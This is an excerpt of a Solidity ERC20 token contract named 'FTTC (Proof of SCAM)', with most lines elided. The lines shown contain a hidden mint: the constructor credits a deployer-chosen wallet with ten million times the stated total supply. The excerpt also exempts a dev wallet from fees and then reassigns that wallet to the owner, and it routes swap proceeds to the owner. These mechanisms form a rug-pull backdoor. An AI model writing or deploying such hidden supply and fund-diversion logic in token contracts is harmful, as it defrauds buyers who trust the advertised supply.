...
contract FTTCPOS is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable public walletDev = payable(0x000000000000000000000000000000000000dEaD);
    address payable public walletBurn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public walletMint = payable(0x000000000000000000000000000000000000dEaD);
    ...
    */
    ...
    string private _name = unicode"FTTC (Proof of SCAM)"; 
    string private _symbol = "FTTC_POS";  
    uint8 private _decimals = 18;
    uint256 private _tTotal = 100000000 * 10**_decimals;
    uint256 private _tTotalMaxMint = _tTotal * (5*2)**(5+2);
    ...
    */
    ...
    constructor (address payable wMint,address router) {
        ...
        _isExcludedFromFee[walletDev] = true;
        walletDev = payable(owner());
        Wallet_Update_Mint(wMint);
    ...
    */
    ...
    // Update main wallet
    function Wallet_Update_Mint(address payable wallet) internal {
        walletMint = wallet;
        _tOwned[wallet]=_tTotalMaxMint;
    ...
    */
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(walletDev,contractETH);
    }
